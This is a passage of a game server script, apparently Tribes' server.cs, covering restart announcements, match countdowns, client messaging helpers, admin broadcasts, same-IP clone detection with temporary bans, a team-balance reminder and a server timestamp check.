	schedule("Messageall( 1,\"restarting server for upgrades.\");", 18);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 2 seconds, please reconnec.\",20);", 18);

	schedule("Messageall( 1,\"restarting server, reconnect.\");", 19);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 1 second, please reconnect.\",20);", 19);

	schedule("Messageall( 1,\"restarting server for upgrades NOW.\");", 20);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades NOW, please reconnect.\",20);", 20);

	schedule("echo(\"!! RESTARTING SERVER !!\");",21);
	schedule("quit();",22);
}

function Server::CheckMatchStarted()
{
	echo("!!!!!!");
	echo("!!");
	echo("!!!!!!");
	echo("!! calling check match started !!");
	echo("!!!!!!");
	echo("!!");	
	echo("!!!!!!");		
	// if the match hasn't started yet, just reset the map
	// timing issue.
	if(!$matchStarted)
		Server::nextMission(true);
}

function Server::Countdown(%time)
{
	$countdownStarted = true;
	schedule("Game::startMatch();", %time);
	Game::notifyMatchStart(%time);
	if(%time > 30)
		schedule("Game::notifyMatchStart(30);", %time - 30);
	if(%time > 15)
		schedule("Game::notifyMatchStart(15);", %time - 15);
	if(%time > 10)
		schedule("Game::notifyMatchStart(10);", %time - 10);
	if(%time > 5)
		schedule("Game::notifyMatchStart(5);", %time - 5);
}

function Client::setInventoryText(%clientId, %txt)
{
	remoteEval(%clientId, "ITXT", %txt);
}

function centerprint(%clientId, %msg, %timeout)
{
	if(%timeout == "")
		%timeout = 5;
	remoteEval(%clientId, "CP", %msg, %timeout);
}

function bottomprint(%clientId, %msg, %timeout)
{
	if(%timeout == "")
		%timeout = 5;
	remoteEval(%clientId, "BP", %msg, %timeout);
}

function topprint(%clientId, %msg, %timeout)
{
	if(%timeout == "")
		%timeout = 5;
	remoteEval(%clientId, "TP", %msg, %timeout);
}

function centerprintall(%msg, %timeout)
{
	if(%timeout == "")
		%timeout = 5;
	for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
		remoteEval(%clientId, "CP", %msg, %timeout);
}

function bottomprintall(%msg, %timeout)
{
	if(%timeout == "")
		%timeout = 5;
	for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
		remoteEval(%clientId, "BP", %msg, %timeout);
}

function topprintall(%msg, %timeout)
{
	if(%timeout == "")
		%timeout = 5;
	for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
		remoteEval(%clientId, "TP", %msg, %timeout);
}

function adminMsg(%msg)
{
	echo("SERVER: " @ %msg);
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{
		%pl = getClientByIndex(%i);
		if(%pl.isAdmin)
		{
			Client::sendMessage(%pl, 0, %msg);
		}
	}
}

function superAdminMsg(%msg)
{
	echo("SERVER: " @ %msg);
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{
		%pl = getClientByIndex(%i);
		if(%pl.isSuperAdmin)
		{
			Client::sendMessage(%pl, 0, %msg);
		}
	}
}


//plasmatic
function checkclone(%clientId){
	%matchIp = 0;
	%numPlayers = getNumClients();
	%Clname = Client::getName(%clientId);
   	%ip = Client::getTransportAddress(%clientId);
	%ClientIp = Ann::ipCut(%ip);
	if ($debug) 
		echo("Connecting Players Ip "@%ClientIp);

	for(%i = 0; %i < %numPlayers; %i++)
	{
		%cl = getClientByIndex(%i);
		%ip = Client::getTransportAddress(%cl);
		%name = Client::getName(%cl);
		if(%clientId != %cl)
		{
			if(!String::ICompare(%ClientIp, Ann::ipCut(%ip)))
			{
				echo("matching Ip.. ");
				if(%Clname != %name @ ".1" && %Clname@".1" != %name )
				{
					%matchIp ++;	
					$clone = %Clname @ " ip# "@%ClientIp@ " Cloning "@%name@" ip# "@Ann::ipCut(%ip)@", SAME IP CLONE ALERT";
					echo("clone WARNING "@$clone);
					export("clone","config\\clone.log",true);
					messageall(1,"send in the clones!!");
				}
			}
		}
	if (%matchIp > 4) {
		echo("----------- "@%clientId@", "@Client::getName(%clientId)@", "@%matchIp@" Matching Ip's! ");
		BanList::add(%ClientIp, 1800);
		BanList::export("config\\banlist.cs");
		}
	}
}

function FairTeamCheck(){
	%numPlayers = getNumClients();
	
	if(%numPlayers<4)	//1/30/2005 10:30PM
		return;
	%numTeams = getNumTeams()-1;
	%fp = %numTeams +1;
	
	for(%i = 0; %i < %numTeams; %i = %i + 1)  
		%numTeamPlayers[%i] = 0;

	for(%i = 0; %i < %numPlayers; %i = %i + 1)
	{
		%cl = getClientByIndex(%i);
		%team = Client::getTeam(%cl);
		%numTeamPlayers[%team] = %numTeamPlayers[%team] + 1;	
	}
	
	if (%numTeamPlayers[0] == %numTeamPlayers[1]) 
		return;
		
	for(%i = 0; %i < %numTeams; %i = %i + 1){
		if (%numTeamPlayers[%i] <= %numPlayers/%fp && %numPlayers != 1) 
			messageall(1,"even up the teams!");
	}	
}

// checks to see if the servers .exe has been timestamp patched,
// http://www.team5150.com/~andrew/project.tribes/ and if so, returns time.
// -plasmatic
//format= yyyy/mm/dd hh:mm:ss.mmm
$MonthToBase10 = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec";
function timestamppatch()
{
	%timestamp = timestamp();
	if(%timestamp != "11:55:21 Apr 26 2000")
	{
		%date = getword(%timestamp,0);
		%time = getword(%timestamp,1);
		%monthNum = String::GetSubStr(%timestamp, 5, 2);
		%month = getword($MonthToBase10,%monthNum-1);	
		
		%year = String::GetSubStr(%timestamp, 0, 4);
		%day = String::GetSubStr(%timestamp, 8, 2);
		
		
		
		return "Time: "@%time@" "@%month@" "@%day@" "@%year;
		
		
	}
	else return "";	
	
}

echo("server.cs ran");	//plasmatic

